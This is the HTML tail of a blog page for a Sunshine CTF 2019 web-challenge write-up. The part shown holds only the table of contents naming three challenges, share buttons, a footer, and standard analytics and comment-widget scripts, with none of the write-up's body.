+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-WrestlerBook"><span class="toc-number">2.</span> <span class="toc-text">0x01 WrestlerBook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目描述"><span class="toc-number">2.1.</span> <span class="toc-text">1.题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解题思路"><span class="toc-number">2.2.</span> <span class="toc-text">2.解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Wrestler-Name-Generator"><span class="toc-number">3.</span> <span class="toc-text">0x02 Wrestler Name Generator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目描述-1"><span class="toc-number">3.1.</span> <span class="toc-text">1.题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解题思路-1"><span class="toc-number">3.2.</span> <span class="toc-text">2.解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Portfolio"><span class="toc-number">4.</span> <span class="toc-text">0x03 Portfolio</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目描述-2"><span class="toc-number">4.1.</span> <span class="toc-text">1.题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解题思路-2"><span class="toc-number">4.2.</span> <span class="toc-text">2.解题思路</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&text=Sunshine CTF 2019 Web"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&is_video=false&description=Sunshine CTF 2019 Web"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sunshine CTF 2019 Web&body=Check out this article: http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&name=Sunshine CTF 2019 Web&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-129276044-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'z3r0yu';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
